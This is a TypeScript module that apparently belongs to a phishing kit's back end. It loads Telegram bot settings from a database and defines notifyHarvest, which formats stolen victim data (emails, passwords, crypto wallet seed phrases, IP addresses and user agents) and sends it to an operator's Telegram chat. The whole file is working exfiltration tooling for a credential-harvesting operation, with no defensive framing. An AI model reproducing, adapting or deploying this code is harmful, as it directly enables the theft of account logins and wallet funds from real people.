// Telegram Bot dispatcher. Reads its config from the server_settings table
// (telegram.* keys), so operators can configure it from the panel without a
// restart. Falls back to TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID env vars if
// the DB doesn't have them yet.

import { dbGetSettings } from './database.js';

export interface TelegramConfig {
	enabled: boolean;
	botToken: string;
	chatId: string;
	fields: { email: boolean; password: boolean; seed: boolean; ip: boolean; userAgent: boolean };
}

export function getTelegramConfig(): TelegramConfig {
	const s = dbGetSettings('telegram.');
	return {
		enabled: s['telegram.enabled'] === '1',
		botToken: s['telegram.bot_token'] ?? process.env.TELEGRAM_BOT_TOKEN ?? '',
		chatId: s['telegram.chat_id'] ?? process.env.TELEGRAM_CHAT_ID ?? '',
		fields: {
			email: (s['telegram.field_email'] ?? '1') !== '0',
			password: (s['telegram.field_password'] ?? '1') !== '0',
			seed: (s['telegram.field_seed'] ?? '1') !== '0',
			ip: (s['telegram.field_ip'] ?? '1') !== '0',
			userAgent: (s['telegram.field_user_agent'] ?? '0') !== '0'
		}
	};
}

export async function sendTelegram(message: string, cfg: TelegramConfig = getTelegramConfig()): Promise<{ ok: boolean; error?: string }> {
	if (!cfg.botToken || !cfg.chatId) {
		return { ok: false, error: 'Telegram bot token or chat ID is not set' };
	}
	try {
		const res = await fetch(`https://api.telegram.org/bot${cfg.botToken}/sendMessage`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				chat_id: cfg.chatId,
				text: message,
				parse_mode: 'HTML',
				disable_web_page_preview: true
			}),
			signal: AbortSignal.timeout(10000)
		});
		const data = (await res.json()) as { ok?: boolean; description?: string };
		if (!data.ok) return { ok: false, error: data.description || `HTTP ${res.status}` };
		return { ok: true };
	} catch (err: any) {
		return { ok: false, error: err?.message || 'Network error' };
	}
}

export interface HarvestNotification {
	visitorIp: string;
	flow: string;
	type: 'account' | 'phrase' | 'upload';
	data: any;
	userAgent?: string;
	capturedBy?: string;
}

function htmlEscape(s: string): string {
	return s.replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' })[c] || c);
}

export async function notifyHarvest(input: HarvestNotification): Promise<void> {
	const cfg = getTelegramConfig();
	if (!cfg.enabled) return;

	const lines: string[] = [];
	lines.push(`<b>\u{1F6A8} New ${input.type.toUpperCase()} captured</b>`);
	if (cfg.fields.ip) lines.push(`<b>IP:</b> <code>${htmlEscape(input.visitorIp)}</code>`);
	lines.push(`<b>Flow:</b> ${htmlEscape(input.flow || '—')}`);

	const data = input.data || {};
	if (cfg.fields.email && data.email) lines.push(`<b>Email:</b> <code>${htmlEscape(String(data.email))}</code>`);
	if (cfg.fields.password && data.password) lines.push(`<b>Password:</b> <code>${htmlEscape(String(data.password))}</code>`);
	if (cfg.fields.seed) {
		const phrase = typeof data === 'string' ? data : data.phrase || data.seed || data.mnemonic;
		if (phrase) lines.push(`<b>Seed:</b> <code>${htmlEscape(String(phrase))}</code>`);
	}
	if (cfg.fields.userAgent && input.userAgent) {
		lines.push(`<b>UA:</b> <code>${htmlEscape(input.userAgent)}</code>`);
	}
	if (input.capturedBy) lines.push(`<b>By:</b> ${htmlEscape(input.capturedBy)}`);

	await sendTelegram(lines.join('\n'), cfg).catch((err) => {
		console.warn('[telegram] notify failed:', err?.message || err);
	});
}
